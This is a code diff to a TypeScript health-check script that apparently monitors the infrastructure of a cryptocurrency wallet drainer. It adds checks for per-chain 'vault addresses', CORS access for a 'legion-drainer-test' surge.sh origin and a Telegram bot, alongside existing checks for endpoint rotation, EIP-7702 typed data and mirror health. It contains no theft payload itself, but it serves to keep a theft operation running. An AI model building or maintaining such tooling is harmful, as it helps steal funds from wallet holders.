@@ -146,14 +146,49 @@ async function checkClientConfig(): Promise<void> {
     const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/api/v1/client-config`, {
       signal: AbortSignal.timeout(15_000),
     })
-    const data = (await res.json()) as { ok?: boolean; data?: { endpoints?: string[] } }
+    const data = (await res.json()) as {
+      ok?: boolean
+      data?: {
+        endpoints?: string[]
+        vault_addresses?: Record<string, string | null>
+        surge_origin_configured?: boolean
+      }
+    }
     if (res.ok && data.data?.endpoints?.length) {
       record('Client config rotation', 'pass', `${data.data.endpoints.length} endpoints`)
+      const vaults = data.data.vault_addresses ?? {}
+      const missing = ['cosmos', 'aptos', 'sui'].filter((k) => !vaults[k])
+      if (missing.length === 0) {
+        record('Vault addresses (8-chain)', 'pass', 'cosmos/aptos/sui exposed')
+      } else {
+        record('Vault addresses (8-chain)', 'warn', `missing: ${missing.join(', ')}`)
+      }
+      if (data.data.surge_origin_configured) {
+        record('Surge CORS', 'pass', 'legion-drainer-test.surge.sh allowed')
+      } else {
+        record('Surge CORS', 'warn', 'add https://legion-drainer-test.surge.sh to API_CORS_ORIGINS')
+      }
     } else {
       record('Client config rotation', 'warn', `HTTP ${res.status}`)
     }
   } catch (e) {
     record('Client config rotation', 'warn', e instanceof Error ? e.message : String(e))
+  }
+}
+
+async function checkTelegramStatus(): Promise<void> {
+  try {
+    const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/telegram-status`, {
+      signal: AbortSignal.timeout(15_000),
+    })
+    const data = (await res.json()) as { ok?: boolean; data?: { running?: boolean } }
+    if (res.ok && data.data?.running) {
+      record('Telegram bot status', 'pass', 'polling active')
+    } else {
+      record('Telegram bot status', 'warn', `HTTP ${res.status}`)
+    }
+  } catch (e) {
+    record('Telegram bot status', 'warn', e instanceof Error ? e.message : String(e))
   }
 }
 
@@ -211,6 +246,7 @@ async function main(): Promise<void> {
 
   await checkBackend()
   await checkClientConfig()
+  await checkTelegramStatus()
   await checkRankedScout()
   await checkEip7702TypedData()
   await checkMirrorHealth(mirrorUrl)
